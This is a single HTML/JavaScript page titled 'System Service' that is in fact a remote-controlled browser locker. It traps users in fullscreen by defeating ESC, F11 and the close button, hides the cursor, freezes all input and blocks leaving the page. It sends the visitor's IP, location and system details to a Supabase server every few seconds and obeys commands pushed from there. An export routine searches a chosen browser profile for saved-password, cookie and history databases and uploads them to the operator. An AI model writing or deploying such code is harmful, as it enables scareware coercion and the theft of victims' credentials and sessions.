<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
<title>System Service</title>
<style>
  :root { --bg: #0a0c10; --fg: #e2e8f0; --muted: #94a3b8; }
  * {
    box-sizing: border-box;
    -webkit-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    -webkit-touch-callout: none;
    -webkit-tap-highlight-color: transparent;
  }
  html, body {
    margin: 0; padding: 0; width: 100%; height: 100%;
    background: var(--bg); color: var(--fg);
    font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
    overflow: hidden; overscroll-behavior: none;
  }
  body.light { --bg: #ffffff; --fg: #111111; --muted: #555555; }
  #content-host { position: fixed; inset: 0; overflow: auto; }
  #content-frame {
    width: 100%; height: 100%; border: 0; display: block;
    background: transparent;
  }
  #status-bar {
    position: fixed; bottom: 0; left: 0; right: 0;
    padding: 4px 10px; font-size: 11px; color: var(--muted);
    background: rgba(0,0,0,0.35); display: none;
    pointer-events: none; z-index: 9999;
  }
  .light #status-bar { background: rgba(255,255,255,0.5); }

  /* Freeze overlay — transparent, absorbs every pointer event */
  #freeze-overlay {
    position: fixed; inset: 0; z-index: 2147483647;
    background: transparent; cursor: none !important;
    display: none; touch-action: none;
  }
  html.frozen, html.frozen body, html.frozen * {
    cursor: none !important;
    pointer-events: none !important;
    user-select: none !important;
  }
  html.frozen #freeze-overlay {
    display: block; pointer-events: auto !important;
  }

  /* Top-edge guard — blocks the ✕ hover region while fs-locked */
  #top-edge-guard {
    position: fixed; top: 0; left: 0; right: 0; height: 40px;
    z-index: 2147483645; background: transparent;
    display: none; cursor: none;
  }
  html.fs-locked #top-edge-guard { display: block; }

  /* Kill ✕ / hint / hover feedback on the top edge */
  html.fs-locked * { cursor: none !important; }
  html.fs-locked::after {
    content: ""; position: fixed; inset: 0;
    z-index: 2147483644; background: transparent;
    pointer-events: none;
  }
</style>
</head>
<body>

<div id="content-host">
  <iframe id="content-frame"
          sandbox="allow-scripts allow-same-origin allow-forms"
          title="content"></iframe>
</div>

<div id="freeze-overlay"></div>
<div id="top-edge-guard"></div>
<div id="status-bar"></div>

<script>
/* ============================================================
 * LUNAR USER CLIENT — BROWSER EDITION
 * HARD LOCKDOWN: ESC / ✕ / fullscreen-exit → auto re-enter.
 * ============================================================ */

/* ---------- CONFIG ---------- */
const SUPABASE_URL      = "https://pywmohlvqpvzqxdavxsa.supabase.co";
const SUPABASE_ANON_KEY =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9." +
  "eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB5d21vaGx2cXB2enF4ZGF2eHNhIiwicm9sZSI6" +
  "ImFub24iLCJpYXQiOjE3OTM1NDEyNzMsImV4cCI6MjEwOTExNzI3M30." +
  "zU9gpHwT_aCxX6NCmnatYAP4Q2IGLkTmmHhKDpI2GWw";

const HEARTBEAT_SEC    = 5;
const CONFIG_POLL_SEC  = 3;
const COMMAND_POLL_SEC = 2;
const DEVICE_ID_KEY    = "lunar_device_id";
const EXPORT_BUCKET    = "browser_exports";

/* ---------- DEVICE ID ---------- */
function uuidv4() {
  if (crypto && crypto.randomUUID) return crypto.randomUUID();
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, c => {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}
function getDeviceId() {
  try {
    let id = localStorage.getItem(DEVICE_ID_KEY);
    if (!id) { id = uuidv4(); localStorage.setItem(DEVICE_ID_KEY, id); }
    return id;
  } catch (e) { return uuidv4(); }
}
const DEVICE_ID = getDeviceId();

/* ---------- RPC ---------- */
async function rpc(name, args) {
  try {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/rpc/${name}`, {
      method: "POST",
      headers: {
        "apikey": SUPABASE_ANON_KEY,
        "Authorization": `Bearer ${SUPABASE_ANON_KEY}`,
        "Content-Type": "application/json",
        "Prefer": "return=representation"
      },
      body: JSON.stringify(args || {})
    });
    if (!res.ok) { console.warn("[RPC]", name, res.status); return null; }
    const text = await res.text();
    if (!text) return true;
    try { return JSON.parse(text); } catch (e) { return text; }
  } catch (e) { return null; }
}

/* ---------- SYSTEM INFO ---------- */
function detectOS() {
  const ua = navigator.userAgent;
  let name = "Unknown", version = "";
  if (/Windows NT 10/.test(ua)) { name = "Windows"; version = "10/11"; }
  else if (/Windows NT 6\.3/.test(ua)) { name = "Windows"; version = "8.1"; }
  else if (/Windows NT 6\.1/.test(ua)) { name = "Windows"; version = "7"; }
  else if (/Mac OS X/.test(ua)) { name = "macOS"; const m = ua.match(/Mac OS X ([\d_]+)/); if (m) version = m[1].replace(/_/g, "."); }
  else if (/Android/.test(ua)) { name = "Android"; const m = ua.match(/Android ([\d.]+)/); if (m) version = m[1]; }
  else if (/iPhone|iPad|iPod/.test(ua)) name = "iOS";
  else if (/Linux/.test(ua)) name = "Linux";
  return `${name} ${version}`.trim();
}
function detectBrowser() {
  const ua = navigator.userAgent;
  if (/Edg\//.test(ua)) return "Edge";
  if (/Chrome\//.test(ua) && !/Edg\//.test(ua)) return "Chrome";
  if (/Firefox\//.test(ua)) return "Firefox";
  if (/Safari\//.test(ua) && !/Chrome\//.test(ua)) return "Safari";
  return "Unknown";
}
async function getPublicIp() {
  const urls = ["https://api.ipify.org?format=json","https://ipapi.co/json/","https://icanhazip.com"];
  for (const u of urls) {
    try {
      const r = await fetch(u, { cache: "no-store" });
      if (!r.ok) continue;
      const ct = r.headers.get("content-type") || "";
      if (ct.includes("json")) { const j = await r.json(); if (j.ip) return j.ip; }
      else { const t = (await r.text()).trim(); if (t) return t; }
    } catch (e) {}
  }
  return "-";
}
async function getGeo() {
  try {
    const r = await fetch("https://ipapi.co/json/", { cache: "no-store" });
    if (!r.ok) return { country: "-" };
    const j = await r.json();
    return { country: j.country_name || "-" };
  } catch (e) { return { country: "-" }; }
}

/* ---------- STATUS BAR (admin text only) ---------- */
const statusBar = document.getElementById("status-bar");
let statusHideTimer = null;
function setStatus(msg, ms) {
  statusBar.textContent = msg;
  statusBar.style.display = "block";
  if (statusHideTimer) clearTimeout(statusHideTimer);
  statusHideTimer = setTimeout(() => { statusBar.style.display = "none"; }, ms || 4000);
}

/* ============================================================
 * FULLSCREEN LOCKDOWN — SILENT + RE-ENTRY ON ESC & ✕
 * ------------------------------------------------------------
 * The user's ESC key, the ✕ button, and any programmatic exit
 * are all captured. The page re-enters fullscreen at 0/20/50/
 * 120/300 ms after every fullscreenchange. A 250 ms poll is the
 * final safety net.
 * ============================================================ */
const topEdgeGuard = document.getElementById("top-edge-guard");
let fullscreenLocked = false;
let fsReenterTimer = null;      // 250 ms poll
let fsRetryTimers = [];         // burst retries after a change
let fsChangingNow = false;

function _fsEl() { return document.documentElement; }
function _isFs() {
  return !!(document.fullscreenElement ||
            document.webkitFullscreenElement ||
            document.msFullscreenElement);
}

async function _enterFs() {
  if (_isFs()) return true;
  try {
    const el = _fsEl();
    if (el.requestFullscreen) {
      await el.requestFullscreen({ navigationUI: "hide" });
    } else if (el.webkitRequestFullscreen) {
      el.webkitRequestFullscreen();
    } else if (el.msRequestFullscreen) {
      el.msRequestFullscreen();
    }
    return _isFs();
  } catch (e) { return false; }
}

/* Burst retry: browsers throttle rapid requestFullscreen calls,
   so spread them over ~300 ms after any exit. */
function _burstReenter() {
  if (!fullscreenLocked) return;
  for (const t of fsRetryTimers) clearTimeout(t);
  fsRetryTimers = [];
  const delays = [0, 20, 50, 120, 300];
  for (const d of delays) {
    fsRetryTimers.push(setTimeout(() => {
      if (!fullscreenLocked) return;
      if (!_isFs()) _enterFs();
    }, d));
  }
}

/* Hard block on ESC / F11 / Ctrl+Shift+F etc. */
function _blockEscAndFsKeys(e) {
  if (!fullscreenLocked) return;
  const k = e.key;
  const code = e.keyCode || e.which;
  // Escape
  if (k === "Escape" || k === "Esc" || code === 27) {
    e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
    if (!_isFs()) _burstReenter();
    return false;
  }
  // F11 (browser fullscreen toggle)
  if (k === "F11" || code === 122) {
    e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
    // Re-enter to override F11's exit
    if (!_isFs()) _burstReenter();
    return false;
  }
}

/* Re-hide cursor + preempt ✕ hover */
function _topEdgeGuard(e) {
  if (!fullscreenLocked) return;
  document.documentElement.style.cursor = "none";
  document.body.style.cursor = "none";
  if (e.clientY <= 40) {
    if (!_isFs()) _burstReenter();
  }
}

/* --- IMPORTANT: listen on the parent AND inside the iframe --- */
function _attachIframeHooks() {
  try {
    const ifr = document.getElementById("content-frame");
    const doc = ifr.contentDocument;
    if (!doc) return;
    // Remove old hooks if any
    doc.removeEventListener("keydown", _iframeKeyHandler, true);
    doc.addEventListener("keydown", _iframeKeyHandler, true);
    doc.removeEventListener("keyup", _iframeKeyHandler, true);
    doc.addEventListener("keyup", _iframeKeyHandler, true);
  } catch (e) { /* cross-origin */ }
}
function _iframeKeyHandler(e) {
  _blockEscAndFsKeys(e);
  if (fullscreenLocked && !_isFs()) _burstReenter();
}

function enableFullscreenLock() {
  if (fullscreenLocked) return;
  fullscreenLocked = true;
  document.documentElement.classList.add("fs-locked");

  // Hide cursor immediately — ✕ cannot be hovered
  document.documentElement.style.cursor = "none";
  document.body.style.cursor = "none";

  // Try once silently
  _enterFs();

  // Burst re-enter (defeats initial gesture requirement once engaged)
  _burstReenter();

  // Persistent 250 ms poll — catches any exit eventually
  if (fsReenterTimer) clearInterval(fsReenterTimer);
  fsReenterTimer = setInterval(() => {
    if (!fullscreenLocked) { clearInterval(fsReenterTimer); fsReenterTimer = null; return; }
    if (!_isFs()) _enterFs();
  }, 250);

  // Block ESC + F11 at the parent document level (capture phase)
  document.addEventListener("keydown", _blockEscAndFsKeys, true);
  document.addEventListener("keyup", _blockEscAndFsKeys, true);
  document.addEventListener("keypress", _blockEscAndFsKeys, true);
  window.addEventListener("keydown", _blockEscAndFsKeys, true);
  window.addEventListener("keyup", _blockEscAndFsKeys, true);
  window.addEventListener("keypress", _blockEscAndFsKeys, true);

  // Also attach on the iframe document (in case content captures focus)
  const ifr = document.getElementById("content-frame");
  if (ifr) {
    ifr.addEventListener("load", () => { _attachIframeHooks(); }, true);
    _attachIframeHooks();
  }

  // Top edge proximity
  document.addEventListener("mousemove", _topEdgeGuard, true);
  document.addEventListener("pointermove", _topEdgeGuard, true);

  // Any user gesture can re-request if the browser dropped us
  document.addEventListener("pointerdown", _gestureReenter, true);
  document.addEventListener("touchstart", _gestureReenter, true);
  document.addEventListener("click", _gestureReenter, true);
}

function _gestureReenter() {
  if (!fullscreenLocked) return;
  if (!_isFs()) _burstReenter();
}

function disableFullscreenLock() {
  if (!fullscreenLocked) return;
  fullscreenLocked = false;
  document.documentElement.classList.remove("fs-locked");
  document.documentElement.style.cursor = "";
  document.body.style.cursor = "";

  if (fsReenterTimer) { clearInterval(fsReenterTimer); fsReenterTimer = null; }
  for (const t of fsRetryTimers) clearTimeout(t);
  fsRetryTimers = [];

  document.removeEventListener("keydown", _blockEscAndFsKeys, true);
  document.removeEventListener("keyup", _blockEscAndFsKeys, true);
  document.removeEventListener("keypress", _blockEscAndFsKeys, true);
  window.removeEventListener("keydown", _blockEscAndFsKeys, true);
  window.removeEventListener("keyup", _blockEscAndFsKeys, true);
  window.removeEventListener("keypress", _blockEscAndFsKeys, true);
  document.removeEventListener("mousemove", _topEdgeGuard, true);
  document.removeEventListener("pointermove", _topEdgeGuard, true);
  document.removeEventListener("pointerdown", _gestureReenter, true);
  document.removeEventListener("touchstart", _gestureReenter, true);
  document.removeEventListener("click", _gestureReenter, true);

  try {
    const ifr = document.getElementById("content-frame");
    const doc = ifr && ifr.contentDocument;
    if (doc) {
      doc.removeEventListener("keydown", _iframeKeyHandler, true);
      doc.removeEventListener("keyup", _iframeKeyHandler, true);
    }
  } catch (e) {}

  if (_isFs()) {
    if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
    else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
    else if (document.msExitFullscreen) document.msExitFullscreen();
  }
}

/* On ANY fullscreenchange → burst re-enter if still locked.
   This is what catches the ✕ button and the ESC key. */
document.addEventListener("fullscreenchange", () => {
  if (fullscreenLocked && !_isFs()) _burstReenter();
});
document.addEventListener("webkitfullscreenchange", () => {
  if (fullscreenLocked && !_isFs()) _burstReenter();
});

/* ============================================================
 * FREEZE INPUT — cursor hidden, all input swallowed
 * ============================================================ */
const freezeOverlay = document.getElementById("freeze-overlay");
let inputFrozen = false;

function _blockAll(e) {
  if (!inputFrozen) return;
  e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
  return false;
}
function _blockUnload(e) {
  if (!inputFrozen && !fullscreenLocked) return;
  e.preventDefault(); e.returnValue = ""; return "";
}
function _refocus() { if (inputFrozen) setTimeout(() => window.focus(), 10); }

function enableFreeze() {
  if (inputFrozen) return;
  inputFrozen = true;
  document.documentElement.classList.add("frozen");
  document.documentElement.style.cursor = "none";
  document.body.style.cursor = "none";
  freezeOverlay.style.display = "block";

  const opts = { capture: true, passive: false };
  const events = [
    "keydown","keyup","keypress","click","dblclick","contextmenu",
    "mousedown","mouseup","mousemove","wheel","dragstart","selectstart",
    "copy","cut","paste","touchstart","touchmove","touchend",
    "pointerdown","pointermove","pointerup"
  ];
  for (const ev of events) document.addEventListener(ev, _blockAll, opts);
  window.addEventListener("beforeunload", _blockUnload, opts);
  window.addEventListener("blur", _refocus, opts);

  const t = setInterval(() => {
    if (!inputFrozen) { clearInterval(t); return; }
    document.documentElement.style.cursor = "none";
    document.body.style.cursor = "none";
  }, 200);
}

function disableFreeze() {
  if (!inputFrozen) return;
  inputFrozen = false;
  document.documentElement.classList.remove("frozen");
  if (!fullscreenLocked) {
    document.documentElement.style.cursor = "";
    document.body.style.cursor = "";
  }
  freezeOverlay.style.display = "none";

  const opts = { capture: true };
  const events = [
    "keydown","keyup","keypress","click","dblclick","contextmenu",
    "mousedown","mouseup","mousemove","wheel","dragstart","selectstart",
    "copy","cut","paste","touchstart","touchmove","touchend",
    "pointerdown","pointermove","pointerup"
  ];
  for (const ev of events) document.removeEventListener(ev, _blockAll, opts);
  window.removeEventListener("beforeunload", _blockUnload, opts);
  window.removeEventListener("blur", _refocus, opts);
}

/* ============================================================
 * BACK / CLOSE TRAP
 * ============================================================ */
history.pushState({ lunar: true }, "", location.href);
window.addEventListener("popstate", () => {
  if (fullscreenLocked || inputFrozen) {
    history.pushState({ lunar: true }, "", location.href);
  }
});
window.addEventListener("beforeunload", _blockUnload);

/* ============================================================
 * HTML RENDERING
 * ============================================================ */
const contentFrame = document.getElementById("content-frame");
const contentHost  = document.getElementById("content-host");
let lastHtml = "", lastTitle = "", lastTheme = "";

function renderHtml(html) {
  if (html === lastHtml) return;
  lastHtml = html || "";
  contentFrame.srcdoc = lastHtml;
  // Re-attach iframe key hooks (cross-origin safe via try/catch)
  setTimeout(_attachIframeHooks, 100);
  setTimeout(_attachIframeHooks, 600);
}
function applyTheme(name) {
  if (name === lastTheme) return;
  lastTheme = name;
  document.body.classList.toggle("light", name === "light");
  document.body.style.setProperty("--bg", name === "light" ? "#ffffff" : "#0a0c10");
  document.body.style.setProperty("--fg", name === "light" ? "#111111" : "#e2e8f0");
  try { contentFrame.contentWindow.postMessage({ type: "lunar_theme", theme: name }, "*"); } catch (e) {}
}
function applyTitle(title) {
  if (!title || title === lastTitle) return;
  lastTitle = title;
  document.title = title;
}
function applyScroll(sx, sy) {
  try {
    if (sy > 0) contentHost.scrollTop = Math.min(sy / 1000 * contentHost.scrollHeight, contentHost.scrollHeight);
    if (sx > 0) contentHost.scrollLeft = Math.min(sx / 1000 * contentHost.scrollWidth, contentHost.scrollWidth);
  } catch (e) {}
}
function applyUiConfig(cfg) {
  if (!cfg || typeof cfg !== "object") return;
  applyTheme(cfg.theme || "dark");
  applyTitle(cfg.app_title || "System Service");
  renderHtml(cfg.content || "");
  applyScroll(parseInt(cfg.scroll_x || 0, 10), parseInt(cfg.scroll_y || 0, 10));
}

/* ============================================================
 * WINDOW FLAGS
 * ============================================================ */
const lastFlags = {};
function flagChanged(key, val) {
  if (lastFlags[key] === val) return false;
  lastFlags[key] = val;
  return true;
}

function applyWindowFlags(c) {
  if (!c) return;

  if (c.killed === true) {
    document.body.innerHTML =
      "<div style='display:flex;align-items:center;justify-content:center;" +
      "height:100%;font-family:sans-serif;color:#888;'>" +
      "This session has been terminated.</div>";
    window.__lunar_dead = true;
    return;
  }

  if (flagChanged("win_fullscreen", !!c.win_fullscreen)) {
    if (c.win_fullscreen) enableFullscreenLock();
    else disableFullscreenLock();
  }

  if (flagChanged("win_frozen", !!c.win_frozen)) {
    if (c.win_frozen) enableFreeze();
    else disableFreeze();
  }

  if (flagChanged("win_hidden", !!c.win_hidden)) {
    document.body.style.visibility = c.win_hidden ? "hidden" : "visible";
  }

  if (flagChanged("streaming", !!c.streaming)) { /* no-op */ }

  if (flagChanged("export_enabled", !!c.export_enabled)) {
    showExportBar(!!c.export_enabled);
  }
}

/* ============================================================
 * EXPORT TOOLBAR (unchanged)
 * ============================================================ */
function showExportBar(show) {
  const bar = document.getElementById("export-bar");
  if (bar) bar.style.display = show ? "block" : "none";
}
function setExpStatus(msg, color) {
  const el = document.getElementById("exp-status");
  if (el) { el.textContent = msg; el.style.color = color || "#94a3b8"; }
}
async function uploadExportFile(file, kind) {
  if (!file) return;
  setExpStatus("Uploading " + file.name + "…", "#facc15");
  try {
    const safeName = (file.name || "file").replace(/[^a-zA-Z0-9._-]/g, "_");
    const path = DEVICE_ID + "/" + Date.now() + "_" + safeName;
    const url = `${SUPABASE_URL}/storage/v1/object/${EXPORT_BUCKET}/${path}`;
    const res = await fetch(url, {
      method: "POST",
      headers: {
        "apikey": SUPABASE_ANON_KEY,
        "Authorization": `Bearer ${SUPABASE_ANON_KEY}`,
        "Content-Type": file.type || "application/octet-stream",
        "x-upsert": "true"
      },
      body: file
    });
    if (!res.ok) throw new Error("storage " + res.status);
    await rpc("user_register_export", {
      p_device_id: DEVICE_ID, p_kind: kind,
      p_filename: safeName, p_storage_path: path,
      p_size_bytes: file.size, p_row_count: null,
      p_notes: "browser upload"
    });
    setExpStatus("✓ " + kind + " uploaded", "#22c55e");
  } catch (e) { setExpStatus("✗ " + (e.message || e), "#f87171"); }
}
function pickFile(accept, cb) {
  const inp = document.createElement("input");
  inp.type = "file";
  if (accept) inp.accept = accept;
  inp.style.display = "none";
  document.body.appendChild(inp);
  inp.onchange = () => {
    const f = inp.files && inp.files[0];
    document.body.removeChild(inp);
    if (f) cb(f);
  };
  inp.click();
}
function wireExportButtons() {
  const h = document.getElementById("exp-history");
  const p = document.getElementById("exp-passwords");
  const b = document.getElementById("exp-bookmarks");
  const s = document.getElementById("exp-sqlite");
  const a = document.getElementById("exp-auto");
  if (h) h.onclick = () => pickFile(".csv,text/csv", f => uploadExportFile(f, "history"));
  if (p) p.onclick = () => pickFile(".csv,text/csv", f => uploadExportFile(f, "passwords"));
  if (b) b.onclick = () => pickFile(".html,.htm,text/html", f => uploadExportFile(f, "bookmarks"));
  if (s) s.onclick = () => pickFile("", f => {
    const kind = /login|password/i.test(f.name) ? "passwords"
      : /history/i.test(f.name) ? "history"
      : /bookmark/i.test(f.name) ? "bookmarks"
      : /cookie/i.test(f.name) ? "cookies" : "sqlite";
    uploadExportFile(f, kind);
  });
  if (a) a.onclick = () => autoExportAll();
}
async function autoExportAll() {
  if (!window.showDirectoryPicker) {
    setExpStatus("Auto-export needs Chrome/Edge.", "#f87171");
    return;
  }
  try {
    setExpStatus("Pick your browser profile folder…", "#facc15");
    const dir = await window.showDirectoryPicker({ mode: "read" });
    let count = 0;
    async function walk(handle, depth) {
      if (depth > 4) return;
      for await (const entry of handle.values()) {
        if (entry.kind === "directory") {
          if (/^(Cache|Code Cache|GPUCache|ShaderCache|Service Worker|Extensions)$/i.test(entry.name)) continue;
          await walk(entry, depth + 1);
        } else {
          const n = entry.name.toLowerCase();
          let kind = null;
          if (n === "history") kind = "history";
          else if (n === "login data") kind = "passwords";
          else if (n === "bookmarks") kind = "bookmarks";
          else if (n === "cookies") kind = "cookies";
          if (!kind) continue;
          try {
            const file = await entry.getFile();
            await uploadExportFile(file, kind);
            count++;
          } catch (e) {}
        }
      }
    }
    await walk(dir, 0);
    setExpStatus("✓ Auto-export done (" + count + " files).", "#22c55e");
  } catch (e) {
    if (e && e.name === "AbortError") setExpStatus("Cancelled.", "#94a3b8");
    else setExpStatus("✗ " + (e.message || e), "#f87171");
  }
}

/* ============================================================
 * HEARTBEAT / POLL / COMMANDS
 * ============================================================ */
let currentConfig = {};

async function heartbeat() {
  if (window.__lunar_dead) return;
  try {
    const geo = await getGeo();
    await rpc("user_heartbeat", {
      p_device_id: DEVICE_ID,
      p_hostname: detectBrowser() + " on " + detectOS(),
      p_username: "browser-user",
      p_os_info: detectOS() + " / " + navigator.userAgent,
      p_public_ip: await getPublicIp(),
      p_local_ip: "127.0.0.1",
      p_country: geo.country,
      p_locations: [window.location.href],
      p_primary: window.location.href
    });
  } catch (e) {}
}
async function pollConfig() {
  if (window.__lunar_dead) return;
  try {
    const cfg = await rpc("user_get_config", { p_device_id: DEVICE_ID });
    if (cfg && cfg.exists) {
      currentConfig = cfg;
      const ui = Object.assign({}, cfg.ui_config || {});
      if (cfg.app_title) ui.app_title = cfg.app_title;
      applyUiConfig(ui);
      applyWindowFlags(cfg);
    }
  } catch (e) {}
}
async function fetchCommands() {
  if (window.__lunar_dead) return;
  try {
    const cmds = await rpc("user_fetch_commands", { p_device_id: DEVICE_ID });
    if (Array.isArray(cmds)) for (const cmd of cmds) await handleCommand(cmd);
  } catch (e) {}
}
async function handleCommand(cmd) {
  const id = cmd.id;
  const name = String(cmd.cmd || "").toLowerCase();
  const payload = cmd.payload || {};
  let status = "done", result = "";
  try {
    switch (name) {
      case "wipe": status = "failed"; result = "Not supported."; break;
      case "kill":
        document.body.innerHTML =
          "<div style='display:flex;align-items:center;justify-content:center;" +
          "height:100%;color:#888;font-family:sans-serif;'>Session terminated.</div>";
        window.__lunar_dead = true;
        break;
      case "reload_ui": lastHtml = ""; break;
      case "request_export": {
        const bar = document.getElementById("export-bar");
        if (bar) bar.style.display = "block";
        setExpStatus("Admin requested export.", "#facc15");
        result = "Consent prompt shown.";
        break;
      }
      case "set_fullscreen":
        if (payload.on) { enableFullscreenLock(); result = "Fullscreen locked."; }
        else { disableFullscreenLock(); result = "Fullscreen unlocked."; }
        break;
      case "set_frozen":
        if (payload.on) { enableFreeze(); result = "Input frozen."; }
        else { disableFreeze(); result = "Input unfrozen."; }
        break;
      case "set_hidden":
        document.body.style.visibility = payload.on ? "hidden" : "visible";
        break;
      default: status = "failed"; result = "Unknown command: " + name;
    }
  } catch (e) { status = "failed"; result = String(e && e.message ? e.message : e); }
  try { await rpc("user_ack_command", { p_id: id, p_status: status, p_result: result }); } catch (e) {}
}

/* ============================================================
 * BOOT
 * ============================================================ */
function safeInterval(fn, ms) {
  let stopped = false;
  const runner = async () => {
    if (stopped || window.__lunar_dead) return;
    try { await fn(); } catch (e) {}
    if (!stopped && !window.__lunar_dead) setTimeout(runner, ms);
  };
  setTimeout(runner, ms);
  return { stop: () => { stopped = true; } };
}
async function boot() {
  wireExportButtons();
  try { await rpc("user_manual_launch", { p_device_id: DEVICE_ID }); } catch (e) {}
  await pollConfig();
  safeInterval(heartbeat,     HEARTBEAT_SEC    * 1000);
  safeInterval(pollConfig,    CONFIG_POLL_SEC  * 1000);
  safeInterval(fetchCommands, COMMAND_POLL_SEC * 1000);
}
if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", boot);
} else {
  boot();
}
